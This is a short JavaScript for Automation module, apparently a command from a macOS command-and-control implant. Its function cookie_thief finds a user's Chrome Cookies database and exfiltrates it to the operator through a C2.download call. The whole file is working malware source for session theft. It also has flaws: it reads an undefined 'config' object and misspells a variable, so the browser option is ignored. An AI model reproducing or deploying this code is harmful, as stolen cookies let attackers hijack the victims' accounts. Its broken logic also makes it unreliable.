exports.cookie_thief = function(task, command, params){
    let password = "";
    let username = "";
    let browser = "chrome";
    let homedir = "/Users/";
    let chromeCookieDir = "Library/Application Support/Google/Chrome/Default/Cookies"
    let cookiedir = "Library/Application Support/Google/Chrome/Default/Cookies"
    if(params === "" || params === undefined)  {
      return {'user_output': "Must supply a the user's login password", "completed": true, "status": "error"};
    }
    if(config.hasOwnProperty("password") && typeof config['password'] == 'string'){ password = config['password']; }
    if(config.hasOwnProperty("username") && typeof config['username'] == 'string') {
      username = config['username'];
      homedir = homedir += username + "/";
    }
    else {
      username = $.NSUserName();
    }
    if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){ browswer = config['browser']; }
    if(browser == "chrome") {
      cookiedir = chromeCookieDir;
    }
    cookieDLPath = homedir + cookiedir;
    try{
        let status = C2.download(task, cookieDLPath);
    	if(status.hasOwnProperty("file_id")){
    	    status['user_output'] = "Finished Downloading";
        }
    	return status;
    }
    catch(error)  {
        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }

};
